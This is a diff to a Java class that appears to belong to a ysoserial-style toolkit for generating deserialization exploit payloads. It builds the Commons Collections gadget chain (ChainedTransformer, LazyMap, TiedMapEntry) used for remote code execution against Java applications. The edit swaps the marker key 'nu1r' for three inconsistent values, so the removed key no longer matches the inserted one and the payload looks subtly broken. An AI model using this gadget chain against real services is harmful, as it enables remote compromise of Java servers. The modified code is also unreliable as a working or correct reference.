@@ -25,10 +25,10 @@ public class commonscollectionsk3 implements ObjectPayload<Object> {
         Transformer   transformerChain = new ChainedTransformer(fakeTransformers);
         Map           innerMap         = new HashMap();
         Map           outerMap         = LazyMap.decorate(innerMap, transformerChain);
-        TiedMapEntry  tme              = new TiedMapEntry(outerMap, "nu1r");
+        TiedMapEntry  tme              = new TiedMapEntry(outerMap, "QI4L");
         Map           expMap           = new HashMap();
-        expMap.put(tme, "nu1r");
-        outerMap.remove("nu1r");
+        expMap.put(tme, "QI5L");
+        outerMap.remove("QI6L");
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
         return expMap;
